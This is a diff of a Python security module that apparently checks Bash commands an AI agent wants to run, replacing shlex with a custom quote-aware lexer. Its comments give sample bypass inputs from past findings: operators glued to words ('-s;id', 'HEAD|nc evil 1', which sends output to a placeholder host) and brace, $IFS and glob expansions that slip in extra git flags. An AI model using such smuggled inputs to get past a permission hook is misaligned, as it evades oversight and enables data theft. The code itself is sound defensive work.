@@ -30,7 +30,6 @@ and are enforced by the hook alone. That gap is DECLARED per rule
 from __future__ import annotations
 
 import re
-import shlex
 from dataclasses import dataclass, field
 from typing import Callable, Iterable, Sequence
 
@@ -117,9 +116,10 @@ class CommandRule:
 
 
 # ARIA-HIGH-443 / ARIA-CRITICAL-446 — what bash reads as an OPERATOR when it
-# is not quoted: its metacharacters `| & ; ( ) < >` and the line break. `shlex`
-# splits on whitespace only, so an operator glued to a word stayed inside one
-# token (`git status -s;id` -> `-s;id`, `git diff HEAD|nc evil 1` -> `HEAD|nc`)
+# is not quoted: its metacharacters `| & ; ( ) < >` and the line break. The
+# lexer (`shell_words`) splits on whitespace only, so an operator glued to a
+# word stayed inside one token (`git status -s;id` -> `-s;id`,
+# `git diff HEAD|nc evil 1` -> `HEAD|nc`)
 # and a line break read as a space; the allow-list matched the first command
 # and bash ran the rest. A carriage return is not a bash separator, but a bare
 # one only ever hides what follows it from a reader, and is refused alike.
@@ -137,13 +137,13 @@ _BLANKS: tuple[str, ...] = (" ", "\t")
 _TWO_CHARACTER_OPERATORS: frozenset[str] = frozenset({
     "&&", "||", ";;", "|&", "<<", ">>", "&>", "<(", ">(", "<&", ">&", "<>", ">|",
 })
-# ANSI-C quoting ends its quote where neither `shlex` nor the scanner below
+# ANSI-C quoting ends its quote where neither the lexer nor the scanner below
 # would (`$'\''` is one quote character, then the quote is closed), so a line
 # carrying it cannot be lexed the way bash runs it: it is never one argv.
 ANSI_C_QUOTE = "$'"
 
-# ARIA-HIGH-505 — what bash EXPANDS, so the argv it runs is not the one
-# `shlex` lexed (measured with a program that prints its argv):
+# ARIA-HIGH-505 — what bash EXPANDS, so the argv it runs is not the one the
+# lexer reads (measured with a program that prints its argv):
 # `git commit -m {x,--amend}` runs `-m x --amend`, `-m x$IFS-n` runs
 # `-m x -n`, `-m ??` runs `-m` plus the file names of the working directory,
 # `-m ~` runs `-m $HOME`. The gate admits only lines whose words bash leaves
@@ -157,8 +157,8 @@ ANSI_C_QUOTE = "$'"
 # `--amend`). git's `HEAD^{tree}`, `@{u}..HEAD` and `HEAD@{1}..HEAD@{2}`
 # have no such `}` and stay admitted. And the two places the lexers remove
 # quoting differently: a backslash before `$`, a backtick or a line break
-# inside double quotes (bash drops the backslash, `shlex` keeps it), and a
-# backslash-newline outside quotes (bash joins the lines, `shlex` keeps the
+# inside double quotes (bash drops the backslash, the lexer keeps it), and a
+# backslash-newline outside quotes (bash joins the lines, the lexer keeps the
 # line break).
 DOLLAR_EXPANSION = "$"
 BACKTICK_SUBSTITUTION = "`"
@@ -180,13 +180,13 @@ _TILDE_PREFIX_AFTER: tuple[str, ...] = ("=", ":")
 
 def unmodelled_shell_syntax(line: str) -> str | None:
     """The first thing in ``line`` that makes bash run something other than
-    the one argv ``shlex.split`` lexes from it, or None.
+    the one argv :func:`shell_words` lexes from it, or None.
 
     THE one scanner of a command line (ARIA-CRITICAL-446 folded ARIA-HIGH-443's
     line-break scan into it; ARIA-HIGH-505 added expansions). The contract:
-    it returns None only for a line whose ``shlex.split`` argv is the argv bash
-    runs in every argument position, comments aside (bash drops an unquoted
-    ``#``-word and the rest of its line, ``shlex`` keeps them, so the gate
+    it returns None only for a line whose :func:`shell_words` argv is the argv
+    bash runs in every argument position, comments aside (bash drops an unquoted
+    ``#``-word and the rest of its line, the lexer keeps them, so the gate
     judges MORE words, never others).
     ``tests/test_bash_expansion_differential.py`` measures that contract
     against bash itself. The command word is not part of it: bash consumes a
@@ -293,6 +293,82 @@ def unmodelled_shell_syntax(line: str) -> str | None:
     return None
 
 
+# What the lexer separates words on: POSIX blanks and the two line breaks
+# (`shlex`'s whitespace set, so its argv is the one the lexer has always
+# produced). The scanner admits no unquoted line break, so on an admitted
+# line only the blanks ever separate.
+_WORD_SEPARATORS: frozenset[str] = frozenset(" \t\r\n")
+# Inside double quotes a backslash escapes only these; before anything else
+# it stays (`"a\b"` is `a\b`). The scanner refuses a backslash before `$`,
+# a backtick or a line break there, the three where bash would drop it.
+_DOUBLE_QUOTED_BACKSLASH_ESCAPES: frozenset[str] = frozenset({'"', "\\"})
+
+
+def shell_words(line: str) -> list[str] | None:
+    """The words of ``line`` under POSIX quoting, or None when it cannot be
+    lexed (an unterminated quote, a trailing backslash).
+
+    THE one lexer of a command line (ARIA-MEDIUM-538). It replaces stdlib
+    ``shlex.split`` (POSIX mode, no comments) word for word, and differs in
+    cost only: ``shlex`` builds each token by string concatenation, which made
+    one admitted 800k-character word cost 12 s in the PreToolUse hook. This
+    is one pass with a character list per word, linear in the length of
+    ``line``. Quoting as POSIX applies it: a single-quoted span is literal; a
+    backslash outside quotes takes the next character; inside double quotes
+    it takes only ``"`` and a backslash and is kept before anything else; an
+    empty quoted span is a word. What bash would run differently is the
+    scanner's question (:func:`unmodelled_shell_syntax`);
+    ``tests/test_bash_expansion_differential.py`` measures this lexer against
+    bash on every line the scanner admits."""
+    words: list[str] = []
+    word: list[str] = []
+    in_word = False
+    quote: str | None = None
+    index, end = 0, len(line)
+    while index < end:
+        char = line[index]
+        if quote == "'":
+            if char == "'":
+                quote = None
+            else:
+                word.append(char)
+        elif quote == '"':
+            if char == '"':
+                quote = None
+            elif char == "\\":
+                index += 1
+                if index == end:
+                    return None
+                escaped = line[index]
+                if escaped not in _DOUBLE_QUOTED_BACKSLASH_ESCAPES:
+                    word.append(char)
+                word.append(escaped)
+            else:
+                word.append(char)
+        elif char == "\\":
+            index += 1
+            if index == end:
+                return None
+            word.append(line[index])
+            in_word = True
+        elif char in ("'", '"'):
+            quote, in_word = char, True
+        elif char in _WORD_SEPARATORS:
+            if in_word:
+                words.append("".join(word))
+                word.clear()
+                in_word = False
+        else:
+            word.append(char)
+            in_word = True
+        index += 1
+    if quote is not None:
+        return None
+    if in_word:
+        words.append("".join(word))
+    return words
+
+
 def argv_of(line: str) -> list[str]:
     """The argv a shell would hand a command line (the hook lexes the Bash
     tool's command the same way). A line that is not exactly one argv stays
@@ -303,10 +379,8 @@ def argv_of(line: str) -> list[str]:
     lexer cannot follow, and an unlexable one."""
     if unmodelled_shell_syntax(line) is not None:
         return [line]
-    try:
-        return shlex.split(line)
-    except ValueError:
-        return [line]
+    words = shell_words(line)
+    return [line] if words is None else words
 
 
 # ARIA-HIGH-124 (round 4) — the closed option grammar of `git commit`
